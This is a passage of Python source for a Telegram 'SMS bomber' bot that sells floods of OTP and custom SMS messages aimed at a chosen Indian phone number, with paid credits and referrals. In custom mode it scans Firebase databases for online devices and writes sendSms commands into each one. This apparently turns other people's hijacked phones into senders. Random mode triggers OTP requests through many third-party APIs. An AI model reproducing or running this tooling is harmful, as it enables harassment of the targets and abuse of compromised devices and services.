    with ThreadPoolExecutor(max_workers=SCAN_WORKERS) as executor:
        futures = {executor.submit(scan_one_firebase, fb): fb for fb in firebases}
        for future in as_completed(futures, timeout=30):
            try: results.append(future.result())
            except Exception: pass
    
    total_online = 0
    total_offline = 0
    all_online_devices = {}
    for r in results:
        if r["online"]:
            all_online_devices[r["tag"]] = {"url": r["url"], "devices": r["online"]}
            total_online += len(r["online"])
        total_offline += r["offline"]
        if r["online"]:
            log.info(f"[SCAN] {r['tag']}: {len(r['online'])} online")
    
    log.info(f"[SCAN RESULT] Total: {total_online} online, {total_offline} offline")
    return {
        "total_online": total_online,
        "total_offline": total_offline,
        "online_devices": all_online_devices,
    }

def check_one_firebase_url(url):
    """Check if a single URL is live"""
    try:
        r = get_session().get(f"{url}/clients.json", timeout=4)
        if r.status_code != 200: return None
        data = r.json()
        if not data or not isinstance(data, dict):
            return {"online": 0, "offline": 0, "total": 0}
        on = off = 0
        for d, i in data.items():
            if _is_device_online(i): on += 1
            else: off += 1
        return {"online": on, "offline": off, "total": on + off}
    except Exception:
        return None

def check_firebases_bulk(urls):
    """Check multiple URLs in parallel"""
    results = []
    with ThreadPoolExecutor(max_workers=SCAN_WORKERS) as executor:
        futures = {executor.submit(check_one_firebase_url, url): url for url in urls}
        for future in as_completed(futures, timeout=60):
            url = futures[future]
            try:
                stats = future.result()
                results.append({"url": url, "stats": stats})
            except Exception:
                results.append({"url": url, "stats": None})
    return results

# ===================== CUSTOM DEVICE WORKER (1 device = 1 SMS) =====================
def custom_chunk_worker(uid, target, message, device_chunk, thread_id=0):
    """
    Send 1 SMS per device in chunk.
    No repeat.
    """
    s = get_session()
    sent = 0
    failed = 0
    
    for fb_url, dev_id in device_chunk:
        # Check stop
        if not bombing_active.get(uid):
            break
        
        # Check global counter
        with counter_lock:
            current = request_counts.get(uid, 0)
            max_count = active_bombings_detail.get(uid, {}).get("max", 999999)
        
        if current >= max_count:
            break
        
        # Prepare message
        msg = message
        if "{otp}" in msg:
            otp = str(random.randint(100000, 999999))
            msg = msg.replace("{otp}", otp)
        
        payload = {"sim": 1, "to": target, "message": msg, "isSended": False}
        
        try:
            r = s.put(
                f"{fb_url}/clients/{dev_id}/webhookEvent/sendSms.json",
                json=payload,
                timeout=2
            )
            if r.status_code in (200, 201, 204):
                with counter_lock:
                    request_counts[uid] = request_counts.get(uid, 0) + 1
                    new_count = request_counts[uid]
                if uid in active_bombings_detail:
                    active_bombings_detail[uid]["requests"] = new_count
                sent += 1
            else:
                failed += 1
        except Exception:
            failed += 1
        
        time.sleep(CUSTOM_DELAY)
    
    log.info(f"[T{thread_id}] uid={uid}: sent={sent} failed={failed}")

# ===================== SAFE SEND =====================
async def safe_send(bot, chat_id, text, **kwargs):
    try: return await bot.send_message(chat_id=chat_id, text=text, **kwargs)
    except RetryAfter as e:
        await asyncio.sleep(e.retry_after + 1)
        try: return await bot.send_message(chat_id=chat_id, text=text, **kwargs)
        except Exception: return None
    except Exception: return None

# ===================== FORCE JOIN =====================
def _recently_verified(uid):
    with _join_lock:
        t = _join_cache.get(uid)
        return bool(t and (time.time() - t) < 300)

def _mark_verified(uid):
    with _join_lock: _join_cache[uid] = time.time()

async def check_force_join(context, uid):
    if has_admin_access(uid): return True
    if _recently_verified(uid): return True
    channels = get_force_channels()
    if not channels: return True
    for ch in channels:
        try:
            m = await context.bot.get_chat_member(chat_id=ch["id"], user_id=uid)
            if m.status not in ("creator", "administrator", "member"): return False
        except Exception: return False
    _mark_verified(uid); return True

def join_keyboard():
    btns = []
    for ch in get_force_channels():
        if ch.get("url"):
            btns.append([InlineKeyboardButton(f"📢 JOIN {ch['label']}", url=ch["url"],
                                              api_kwargs={"style": "primary"})])
    btns.append([InlineKeyboardButton("✅ VERIFY", callback_data="join_check",
                                      api_kwargs={"style": "success"})])
    return InlineKeyboardMarkup(btns)

async def prompt_join(msg):
    txt = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
           "   🔐 ᴄʜᴀɴɴᴇʟ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ\n"
           "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
           "Join our official channel first.\n\n"
           "1. Click 📢 JOIN\n2. Join\n3. Come back and click ✅ VERIFY\n\n"
           "━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    kb = join_keyboard()
    if hasattr(msg, "edit_message_text"):
        try: await msg.edit_message_text(txt, reply_markup=kb); return
        except Exception: pass
    try: await msg.reply_text(txt, reply_markup=kb)
    except Exception: pass

# ===================== WELCOME UI =====================
def welcome_text(uid):
    u = get_user(uid)
    if not u: create_user(uid); u = get_user(uid)
    check_free_refill(uid); u = get_user(uid)
    if is_owner(uid): plan = "ᴏᴡɴᴇʀ"
    elif is_admin(uid): plan = "ᴀᴅᴍɪɴ"
    elif is_premium_active(uid): plan = "ᴘʀᴇᴍɪᴜᴍ"
    else: plan = "ꜰʀᴇᴇ"
    name = (u.get("first_name") or "ᴜɴᴋɴᴏᴡɴ")[:15]
    fa_max = int(get_config("free_attacks", "2"))
    if has_admin_access(uid) or is_premium_active(uid):
        used_txt = "∞"; bar = "▰▰▰▰▰"; refill_txt = "∞"
    else:
        used = u.get("free_attacks_used", 0)
        used_txt = f"{used}/{fa_max}"
        filled = min(used, fa_max)
        bar = "▰" * filled + "▱" * (fa_max - filled)
        refill_txt = get_refill_countdown(uid)
    credits = u.get("credits", 0)
    return (
        f"🤖 {sc('Warrior Bomber Bot')} ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👋 {sc('Hey')}, {name}!\n"
        f"🆔 `{uid}`\n\n"
        f"💎 {plan} ᴘʟᴀɴ\n"
        f"🟢 ᴀᴄᴛɪᴠᴇ\n\n"
        f"⚔️ ᴀᴛᴛᴀᴄᴋꜱ  {bar} {used_txt}\n"
        f"⏱️ ʀᴇꜰɪʟʟ  {refill_txt}\n"
        f"💎 ᴄʀᴇᴅɪᴛꜱ  {credits}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 {sc('By Warrior X Technical White Hat')}"
    )

def user_main_kb(uid):
    kb = [
        [InlineKeyboardButton("🔥  START BOMBING", callback_data="bomb:start",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("💳  Recharge", callback_data="user:recharge",
                              api_kwargs={"style": "primary"}),
         InlineKeyboardButton("🎁  Redeem", callback_data="user:redeem",
                              api_kwargs={"style": "success"})],
        [InlineKeyboardButton("🔗  Refer", callback_data="user:refer",
                              api_kwargs={"style": "primary"}),
         InlineKeyboardButton("📜  History", callback_data="user:history",
                              api_kwargs={"style": "primary"})],
        [InlineKeyboardButton("🛡️  Status", callback_data="user:system",
                              api_kwargs={"style": "primary"}),
         InlineKeyboardButton("👨‍💻  Support", url=SUPPORT_LINK,
                              api_kwargs={"style": "primary"})],
    ]
    if has_admin_access(uid):
        kb.append([InlineKeyboardButton("🔐  Admin Panel", callback_data="adm:main",
                                        api_kwargs={"style": "danger"})])
    return InlineKeyboardMarkup(kb)

async def send_main_menu(context, chat_id, uid):
    await safe_send(context.bot, chat_id, welcome_text(uid),
                    reply_markup=user_main_kb(uid), parse_mode="Markdown")
# ===================== LOADING ANIMATION =====================
async def show_loading_animation(context, chat_id, scan_msg_id):
    """Generic loading animation — Firebase details hidden"""
    stages = [
        ("⏳ Initializing...", 10),
        ("⚙️ Connecting...", 30),
        ("🔧 Preparing...", 50),
        ("⚡ Loading...", 75),
        ("🎯 Almost ready...", 90),
        ("✅ Ready!", 100),
    ]
    for label, pct in stages:
        filled = int(pct / 5)
        bar = "▓" * filled + "░" * (20 - filled)
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=scan_msg_id,
                text=(
                    f"⚡ {sc('PREPARING ATTACK')}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"{label}\n"
                    f"{bar} {pct}%\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                ),
                parse_mode="Markdown")
        except Exception: pass
        await asyncio.sleep(0.85)

# ===================== PROGRESS LOOP =====================
async def _progress_loop(uid, chat_id, target, context, progress_msg,
                         max_count, title, stop_kb):
    last_update = 0
    start_time = time.time()
    last_count = 0
    stuck_checks = 0
    
    try:
        while bombing_active.get(uid):
            await asyncio.sleep(1)
            cur = request_counts.get(uid, 0)
            elapsed = time.time() - start_time
            runtime = max(1, int(elapsed))
            speed = cur // runtime
            
            # Stop at limit
            if cur >= max_count:
                log.info(f"[PROGRESS] uid={uid}: Limit reached ({cur}/{max_count})")
                bombing_active[uid] = False
                break
            
            # Stuck detection (5 sec no progress)
            if cur == last_count:
                stuck_checks += 1
                if stuck_checks >= 5:
                    log.warning(f"[PROGRESS] uid={uid}: Stuck at {cur}, stopping")
                    bombing_active[uid] = False
                    break
            else:
                stuck_checks = 0
                last_count = cur
            
            # Update display
            pct = min(int((cur / max_count) * 100), 100) if max_count > 0 else 0
            now = time.time()
            
            if now - last_update >= STATUS_UPDATE_INTERVAL:
                last_update = now
                filled = int(pct / 5)
                bar = "█" * filled + "░" * (20 - filled)
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=progress_msg.message_id,
                        text=(
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"   💣 {sc('BOMBING')} — {title}\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📱 +91{target}\n\n"
                            f"{bar} {pct}%\n\n"
                            f"🟢 {sc('Status')}: {sc('Active')}\n"
                            f"📨 {sc('Sent')}: {cur} / {max_count}\n"
                            f"⚡ {sc('Speed')}: {speed}/sec\n"
                            f"⏱️ {sc('Time')}: {runtime}s\n\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                        ),
                        reply_markup=stop_kb,
                        parse_mode="Markdown")
                except Exception as e:
                    if "not modified" not in str(e).lower():
                        log.debug(f"progress: {e}")
    except Exception as e:
        log.error(f"progress loop: {e}")
    finally:
        bombing_active[uid] = False
        info = active_bombings_detail.get(uid, {})
        runtime = int(time.time() - info.get("started", time.time()))
        final = request_counts.pop(uid, 0)
        active_bombings_detail.pop(uid, None)
        bombing_threads.pop(str(uid), None)
        log.info(f"[DONE] uid={uid}: {final} SMS in {runtime}s")
        log_activity(uid, "Bombing", f"{title} on {target} — {final} req in {runtime}s")
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=progress_msg.message_id,
                text=(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   ✅ {sc('COMPLETED')}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📱 +91{target}\n\n"
                    f"████████████████████ 100%\n\n"
                    f"📨 {sc('Total')}: {final} / {max_count}\n"
                    f"⏱️ {sc('Runtime')}: {runtime}s\n"
                    f"⚡ {sc('Avg Speed')}: {final // max(runtime, 1)}/sec\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                ),
                parse_mode="Markdown")
        except Exception: pass
        await asyncio.sleep(2)
        try:
            await send_main_menu(context, chat_id, uid)
        except Exception: pass

# ===================== CUSTOM BOMBING RUNNER =====================
async def _run_custom_bombing(uid, target, context, mode,
                              max_count, online_devices):
    """
    Run custom bombing — 1 device = 1 SMS.
    Devices selected = min(max_count, total_online)
    """
    chat_id = uid
    message = context.user_data.get("custom_message", "Your code is {otp}")
    
    with counter_lock:
        request_counts[uid] = 0
    bombing_active[uid] = True
    
    u = get_user(uid) or {}
    active_bombings_detail[uid] = {
        "username": u.get("username") or "",
        "target": target, "started": time.time(),
        "requests": 0, "mode": mode, "max": max_count,
    }
    
    # Flatten ALL online devices
    all_devices = []
    for tag, info in online_devices.items():
        fb_url = info["url"]
        for dev_id in info["devices"]:
            all_devices.append((fb_url, dev_id))
    
    total_available = len(all_devices)
    
    # Slice: sirf max_count devices (no repeat)
    if total_available > max_count:
        selected_devices = random.sample(all_devices, max_count)
    else:
        selected_devices = all_devices
    
    log.info(f"[RUN] uid={uid} | available={total_available} | max={max_count} | selected={len(selected_devices)}")
    
    stop_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑  STOP", callback_data="bomb:stop",
                              api_kwargs={"style": "danger"})]
    ])
    
    try:
        progress_msg = await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"   💣 {sc('CUSTOM BOMBING')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📱 +91{target}\n\n"
                f"░░░░░░░░░░░░░░░░░░░░ 0%\n\n"
                f"🟢 {sc('Status')}: {sc('Active')}\n"
                f"📨 {sc('Sent')}: 0 / {max_count}\n"
                f"⚡ {sc('Speed')}: 0/sec\n"
                f"⏱️ {sc('Time')}: 0s\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            ),
            reply_markup=stop_kb, parse_mode="Markdown")
    except Exception as e:
        log.error(f"progress fail: {e}"); return
    
    # Distribute devices among threads (chunks)
    num_threads = min(THREAD_COUNT, max(1, len(selected_devices) // 5))
    chunks = [[] for _ in range(num_threads)]
    for i, dev in enumerate(selected_devices):
        chunks[i % num_threads].append(dev)
    
    log.info(f"[RUN] uid={uid}: {num_threads} threads | chunk sizes={[len(c) for c in chunks]}")
    
    for i, chunk in enumerate(chunks):
        _global_executor.submit(custom_chunk_worker,
                                uid, target, message, chunk, i)
    
    bombing_threads[str(uid)] = []
    
    await _progress_loop(uid, chat_id, target, context, progress_msg,
                         max_count, "ᴄᴜꜱᴛᴏᴍ", stop_kb)

# ===================== START BOMBING =====================
async def start_bombing(uid, target, context, mode):
    chat_id = uid
    
    # Deduct attack
    ok, reason = deduct_attack_or_credit(uid)
    if not ok:
        u = get_user(uid)
        fa_max = int(get_config("free_attacks", "2"))
        free_used = u.get("free_attacks_used", 0) if u else 0
        credits = u.get("credits", 0) if u else 0
        await safe_send(context.bot, chat_id,
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "   ❌ ɴᴏ ᴀᴛᴛᴀᴄᴋꜱ ʟᴇꜰᴛ\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚔️ Free: {free_used}/{fa_max}\n"
            f"⏱️ Refill: {get_refill_countdown(uid)}\n"
            f"💰 Credits: {credits}\n\n"
            "💡 Buy credits to continue",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💳 BUY CREDITS", callback_data="user:recharge",
                                      api_kwargs={"style": "success"})],
                [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                      api_kwargs={"style": "primary"})],
            ]))
        return
    
    # Get limits
    if has_admin_access(uid) or is_premium_active(uid):
        max_sms = 999999
    else:
        if mode == "random":
            max_sms = int(get_config("random_max_sms", "500"))
        else:
            max_sms = int(get_config("custom_max_sms", "100"))
    
    # ========== CUSTOM MODE ==========
    if mode == "custom":
        if not get_firebases():
            await safe_send(context.bot, chat_id,
                "⚠️ *No Firebase configured*\n\nContact admin.",
                parse_mode="Markdown")
            return
        
        scan_msg = await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "⚡ *PREPARING ATTACK*\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "⏳ Initializing...\n"
                "░░░░░░░░░░░░░░░░░░░░ 0%\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            ),
            parse_mode="Markdown")
        
        anim_task = asyncio.create_task(
            show_loading_animation(context, chat_id, scan_msg.message_id))
        
        scan_result = await asyncio.to_thread(scan_all_firebases_fast)
        total_online = scan_result["total_online"]
        all_online_devices = scan_result["online_devices"]
        
        log.info(f"[SCAN] uid={uid}: {total_online} online devices")
        
        try:
            await asyncio.wait_for(anim_task, timeout=6)
        except asyncio.TimeoutError:
            anim_task.cancel()
        
        if total_online == 0:
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id, message_id=scan_msg.message_id,
                    text=("❌ *NO DEVICES AVAILABLE*\n"
                          "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                          "Please try again later."),
                    parse_mode="Markdown")
            except Exception: pass
            return
        
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=scan_msg.message_id,
                text=("✅ *READY*\n"
                      "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                      "Starting..."),
                parse_mode="Markdown")
        except Exception: pass
        
        await asyncio.sleep(0.5)
        try: await context.bot.delete_message(chat_id, scan_msg.message_id)
        except Exception: pass
        
        # ✅ Effective limit = min(set_limit, online_devices)
        effective_max = min(max_sms, total_online)
        log.info(f"[BOMBING] uid={uid} | max_sms={max_sms} | total_online={total_online} | effective_max={effective_max}")
        
        await _run_custom_bombing(uid, target, context, mode,
                                  effective_max, all_online_devices)
        return
    
    # ========== RANDOM MODE ==========
    request_counts[uid] = 0
    bombing_active[uid] = True
    u = get_user(uid) or {}
    active_bombings_detail[uid] = {
        "username": u.get("username") or "",
        "target": target, "started": time.time(),
        "requests": 0, "mode": mode, "max": max_sms,
    }
    
    stop_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑  STOP", callback_data="bomb:stop",
                              api_kwargs={"style": "danger"})]
    ])
    
    try:
        progress_msg = await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"   💣 {sc('RANDOM OTP BOMBING')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📱 +91{target}\n\n"
                f"░░░░░░░░░░░░░░░░░░░░ 0%\n\n"
                f"🟢 {sc('Status')}: {sc('Active')}\n"
                f"📨 {sc('Sent')}: 0 / {max_sms}\n"
                f"⚡ {sc('Speed')}: 0/sec\n"
                f"⏱️ {sc('Time')}: 0s\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            ),
            reply_markup=stop_kb, parse_mode="Markdown")
    except Exception as e:
        log.error(f"progress fail: {e}"); return
    
    for _ in range(THREAD_COUNT):
        _global_executor.submit(random_otp_worker, uid, target)
    bombing_threads[str(uid)] = []
    
    await _progress_loop(uid, chat_id, target, context, progress_msg,
                         max_sms, "ʀᴀɴᴅᴏᴍ", stop_kb)
# ===================== USER HANDLERS =====================
async def start(update, context):
    async with _user_semaphore:
        try:
            u = update.effective_user
            uid = u.id
            if is_banned(uid):
                await update.message.reply_text(
                    f"🚫 *ACCESS DENIED*\n\nYou are banned.\n\n"
                    f"📌 Contact: {SUPPORT_USERNAME}",
                    parse_mode="Markdown")
                return
            create_user(uid, u.username or "", u.first_name or "")
            check_free_refill(uid)
            
            if get_config("maintenance", "0") == "1" and not has_admin_access(uid):
                await update.message.reply_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   🛠️ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Bot is under maintenance.\n\n"
                    "⏱️ Back soon!\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📢 {CHANNEL_USERNAME}\n💬 {SUPPORT_USERNAME}",
                    parse_mode="Markdown")
                return
            
            if context.args and context.args[0].startswith("ref_"):
                try:
                    ref_id = int(context.args[0][4:])
                    if ref_id != uid:
                        ref_user = get_user(ref_id)
                        me = get_user(uid)
                        if ref_user and me and not me.get("referrer_id"):
                            update_user(ref_id,
                                credits=ref_user.get("credits", 0) + 5,
                                referral_count=ref_user.get("referral_count", 0) + 1)
                            update_user(uid, referrer_id=ref_id)
                            try:
                                await context.bot.send_message(ref_id,
                                    f"🎉 *REFERRAL SUCCESS*\n\n"
                                    f"👤 @{u.username or uid} joined!\n"
                                    f"💰 +5 Credits added",
                                    parse_mode="Markdown")
                            except Exception: pass
                except Exception: pass
            
            if not await check_force_join(context, uid):
                await prompt_join(update.message); return
            
            await send_main_menu(context, update.message.chat_id, uid)
        except Exception as e:
            log.error(f"start error: {e}")

async def join_callback(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if q.data == "join_check":
        _join_cache.pop(uid, None)
        if await check_force_join(context, uid):
            await q.answer("✅ Verified!", show_alert=True)
            try: await q.edit_message_text("✅ VERIFIED", parse_mode="Markdown")
            except Exception: pass
            await asyncio.sleep(0.5)
            await send_main_menu(context, q.message.chat_id, uid)
        else:
            await q.answer("❌ Not joined yet!", show_alert=True)

async def cancel_cmd(update, context):
    context.user_data.clear()
    await update.message.reply_text("❌ Cancelled.")

# ===================== TEXT HANDLER =====================
async def handle_text(update, context):
    async with _user_semaphore:
        try:
            uid = update.effective_user.id
            text = (update.message.text or "").strip()
            if is_banned(uid): return
            
            if await handle_admin_input(update, context):
                return
            
            check_free_refill(uid)
            
            if not await check_force_join(context, uid):
                await prompt_join(update.message); return
            
            # Redeem code
            if context.user_data.get("awaiting_redeem"):
                code = text.upper()
                conn = db(); c = conn.cursor()
                c.execute("SELECT credits, max_uses, used_count FROM redeem_codes WHERE code = ?",
                          (code,))
                row = c.fetchone()
                if not row:
                    conn.close()
                    await update.message.reply_text("❌ *INVALID CODE*", parse_mode="Markdown")
                    context.user_data.pop("awaiting_redeem", None); return
                credits, max_uses, used_count = row
                c.execute("SELECT id FROM redeem_history WHERE code = ? AND user_id = ?",
                          (code, uid))
                if c.fetchone():
                    conn.close()
                    await update.message.reply_text("❌ *ALREADY USED*", parse_mode="Markdown")
                    context.user_data.pop("awaiting_redeem", None); return
                if used_count >= max_uses:
                    conn.close()
                    await update.message.reply_text("❌ *CODE EXPIRED*", parse_mode="Markdown")
                    context.user_data.pop("awaiting_redeem", None); return
                u = get_user(uid)
                new_credits = u.get("credits", 0) + credits
                c.execute("UPDATE users SET credits = ? WHERE user_id = ?", (new_credits, uid))
                c.execute("UPDATE redeem_codes SET used_count = used_count + 1 WHERE code = ?", (code,))
                c.execute("INSERT INTO redeem_history (code, user_id, credits) VALUES (?, ?, ?)",
                          (code, uid, credits))
                conn.commit(); conn.close()
                log_activity(uid, "Redeem", f"{code} — +{credits}")
                await update.message.reply_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   ✅ ᴄᴏᴅᴇ ʀᴇᴅᴇᴇᴍᴇᴅ\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🎁 Code: `{code}`\n💰 +{credits} Credits\n"
                    f"💰 New Balance: `{new_credits}`\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔥 START BOMBING", callback_data="bomb:start",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🏠 HOME", callback_data="user:back",
                                              api_kwargs={"style": "primary"})],
                    ]))
                context.user_data.pop("awaiting_redeem", None)
                return
            
            # Target input
            if context.user_data.get("awaiting_target"):
                mode = context.user_data.get("bomb_mode")
                if text.isdigit() and len(text) == 10:
                    if is_protected(text):
                        await update.message.reply_text(
                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            "   🛡️ ᴘʀᴏᴛᴇᴄᴛᴇᴅ ɴᴜᴍʙᴇʀ\n"
                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"Target `{text}` is protected.\n\n"
                            "❌ Cannot bomb this number.\n\n"
                            "Please try a different number.\n\n"
                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                            parse_mode="Markdown",
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                                      api_kwargs={"style": "primary"})],
                            ]))
                        context.user_data.clear(); return
                    if is_blacklisted(text):
                        await update.message.reply_text("⛔ Blacklisted number.")
                        context.user_data.clear(); return
                    context.user_data["target"] = text
                    if mode == "random":
                        context.user_data.pop("awaiting_target", None)
                        await update.message.reply_text(
                            f"✅ Target: `{text}`\n\n⏳ Starting...",
                            parse_mode="Markdown")
                        asyncio.create_task(start_bombing(uid, text, context, "random"))
                    else:
                        context.user_data["awaiting_message"] = True
                        context.user_data.pop("awaiting_target", None)
                        await update.message.reply_text(
                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            "   ✏️ ᴄᴜꜱᴛᴏᴍ ᴍᴇꜱꜱᴀɢᴇ\n"
                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                            "Type your message:\n\n"
                            "💡 Use `{otp}` for random OTP\n\n"
                            "Example:\n`Your code is {otp}`\n\n"
                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                            parse_mode="Markdown")
                else:
                    await update.message.reply_text("❌ Enter valid 10-digit number.")
                return
            
            # Custom message input
            if context.user_data.get("awaiting_message"):
                if not text: return
                target = context.user_data.get("target")
                context.user_data["custom_message"] = text
                context.user_data.pop("awaiting_message", None)
                await update.message.reply_text("✅ Message saved\n⏳ Starting...")
                asyncio.create_task(start_bombing(uid, target, context, "custom"))
                return
        except Exception as e:
            log.error(f"handle_text: {e}")

# ===================== USER CALLBACK =====================
async def user_callback(update, context):
    async with _user_semaphore:
        try:
            q = update.callback_query
            await q.answer()
            uid = q.from_user.id
            data = q.data
            if is_banned(uid):
                await q.edit_message_text("🚫 Banned."); return
            
            # START BOMBING
            if data == "bomb:start":
                if not await check_force_join(context, uid):
                    await prompt_join(q); return
                kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔢  RANDOM OTP", callback_data="bomb_type:random",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("✏️  CUSTOM MESSAGE", callback_data="bomb_type:custom",
                                          api_kwargs={"style": "primary"})],
                    [InlineKeyboardButton("❌  CANCEL", callback_data="user:back",
                                          api_kwargs={"style": "danger"})],
                ])
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   🎯 ꜱᴇʟᴇᴄᴛ ᴛʏᴘᴇ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Choose bombing mode:\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    reply_markup=kb)
                return
            
            # BOMB TYPE
            if data.startswith("bomb_type:"):
                mode = data.split(":")[1]
                context.user_data["bomb_mode"] = mode
                context.user_data["awaiting_target"] = True
                title = "🔢 ʀᴀɴᴅᴏᴍ ᴏᴛᴘ" if mode == "random" else "✏️ ᴄᴜꜱᴛᴏᴍ"
                info = "Auto OTP via 108 APIs" if mode == "random" else "Custom message via Firebase"
                await q.edit_message_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   {title} ʙᴏᴍʙɪɴɢ\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"Send target number:\n\n"
                    f"📱 Format: `9876543210`\n\n"
                    f"ℹ️ {info}\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("❌ CANCEL", callback_data="user:back",
                                              api_kwargs={"style": "danger"})],
                    ]))
                return
            
            # STOP BOMBING
            if data == "bomb:stop":
                if bombing_active.get(uid):
                    bombing_active[uid] = False
                    await q.answer("🛑 Stopped", show_alert=False)
                    cur = request_counts.get(uid, 0)
                    try:
                        await q.edit_message_text(
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"   🛑 ꜱᴛᴏᴘᴘᴇᴅ\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📨 {sc('Sent')}: {cur}\n\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                            parse_mode="Markdown")
                    except Exception: pass
                    await asyncio.sleep(1.5)
                    try: await q.message.delete()
                    except Exception: pass
                    await send_main_menu(context, q.message.chat_id, uid)
                else:
                    await q.answer("No active bombing.", show_alert=True)
                return
            
            # RECHARGE
            if data == "user:recharge":
                kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton("💳 5 Credits — ₹25", callback_data="rc:5",
                                          api_kwargs={"style": "primary"})],
                    [InlineKeyboardButton("💎 10 Credits — ₹50", callback_data="rc:10",
                                          api_kwargs={"style": "primary"})],
                    [InlineKeyboardButton("🚀 25 Credits — ₹100", callback_data="rc:25",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("👑 50 Credits — ₹200", callback_data="rc:50",
                                          api_kwargs={"style": "primary"})],
                    [InlineKeyboardButton("⚡ 1 Month Premium — ₹300", callback_data="rc:month1",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("🔥 3 Months Premium — ₹700", callback_data="rc:month3",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("🔙 BACK", callback_data="user:back",
                                          api_kwargs={"style": "danger"})],
                ])
                await q.edit_message_text(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   💳 ᴘʟᴀɴꜱ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "💰 ᴄʀᴇᴅɪᴛꜱ (ɴᴏ ᴇxᴘɪʀʏ):\n"
                    "   • 5 Credits — ₹25\n"
                    "   • 10 Credits — ₹50\n"
                    "   • 25 Credits — ₹100\n"
                    "   • 50 Credits — ₹200\n\n"
                    "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ ᴘʟᴀɴꜱ:\n"
                    "   • 1 Month — ₹300\n"
                    "   • 3 Months — ₹700\n\n"
